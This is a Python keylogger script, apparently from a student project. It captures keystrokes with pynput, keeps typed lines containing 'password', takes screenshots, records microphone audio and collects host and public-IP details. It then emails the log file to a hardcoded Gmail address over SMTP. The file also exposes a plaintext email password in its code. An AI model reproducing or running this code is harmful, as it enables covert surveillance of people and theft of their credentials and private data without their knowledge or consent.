# Keylogger

# Libraries
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from pynput.keyboard import Listener
import logging
from PIL import ImageGrab
from datetime import datetime

import socket
import platform

from scipy.io.wavfile import write
import sounddevice as sd
import getpass
from requests import get

# TODO: Add folder structure based on date?
log_directory = ""
logging.basicConfig(filename="log_results.txt", level=logging.DEBUG, format='%(message)s', filemode='w')

sender_email = "tnm031keylogger@gmail.com"
receiver_email = "tnm031keylogger@gmail.com"
password = "tnm031pizza"
filename = "log_results.txt"
subject = "Keys logged"
body = "This is an email with attachment sent from Python"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

message.attach(MIMEText(body, "plain"))

# Global storage of keys for the keylogger
keys = []


def screenshot(image_name):
    im = ImageGrab.grab()
    im.save(image_name)


with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

encoders.encode_base64(part)

message.attach(part)
text = message.as_string()

context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)


# get the computer information
def computer_information():
    with open("systeminfo.txt", "a") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception as e:
            f.write(str(e))

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ipaddr + "\n")


computer_information()


def microphone():
    fs = 44100
    seconds = 5

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write("audio.wav", fs, recording)


# TODO: Fix special keys
def on_press(key):
    global keys

    k = str(key).replace("'", "")

    # TODO: Fix functionality for when to take the screenshot
    # TODO: Fix when to start recording audio with microphone()
    # TODO: fix invalid argument for OS
    if key == keyboard.Key.esc:
        screenshot(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + '.png')

    elif key == keyboard.Key.space:
        keys.append(" ")

# Save to file if password is mentioned
    elif key == keyboard.Key.enter:
        s = "".join(keys)
        if s.find("password") > 0:
            logging.info("\n")
            logging.info(s)
        else:
            keys = []
    else:
        keys.append(k)


if __name__ == '__main__':
    with Listener(on_press=on_press) as listener:
        listener.join()
